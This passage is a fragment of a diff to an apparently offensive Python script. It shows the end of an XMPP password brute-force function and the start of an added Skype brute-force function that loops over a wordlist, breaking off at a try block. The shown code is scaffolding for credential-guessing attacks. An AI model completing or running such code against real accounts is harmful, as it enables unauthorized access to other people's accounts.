@@ -186,3 +186,15 @@ def xmppBruteforce(address, port, username, wordlist, delay):
         except:
             print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
             sleep(delay)
+
+################################################################
+#
+################################################################
+
+def skypeBruteforce(username, wordlist, delay):
+    wordlist = open(wordlist, 'r')
+    # Processing wordlist...
+    for i in wordlist.readlines():
+        password = i.strip("\n")
+        try:
+            
